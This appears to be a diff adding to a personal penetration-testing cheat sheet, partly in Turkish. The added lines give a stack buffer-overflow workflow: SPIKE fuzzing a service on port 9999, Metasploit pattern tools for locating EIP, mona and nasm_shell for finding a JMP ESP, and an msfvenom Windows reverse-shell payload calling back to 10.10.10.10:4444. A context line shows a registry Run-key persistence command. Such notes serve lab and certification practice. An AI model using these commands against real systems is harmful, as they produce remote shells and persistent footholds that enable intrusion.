@@ -337,5 +337,21 @@ C:\Users\Windows\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe
 
 reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v upgrade /t REG_SZ /d "C:\Users\AppData\upgrade.exe"
 
+## Spike ##
+
+generic_send_tcp 10.10.10.10 9999 spike.spk 0 0
+
+cd /usr/share/metasploit-framework/tools/exploit - ./pattern_create.rb -l 3000 - ./pattern_offset.rb -l -q ---> EIP değeri
+
+cd /usr/share/metasploit-framework/tools/exploit ./nasm_shell.rb ---> JMP ESP 
+
+!mona modules - !mona find -s "\xff\xe4" -m < seçilen dll yada çalışan exe > ## ---> FFE4 output nasm shell.rb
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00" ---> badcharacter
+
+## Locate ##
+
+locate < dosyanın tam adı >
+
  
 
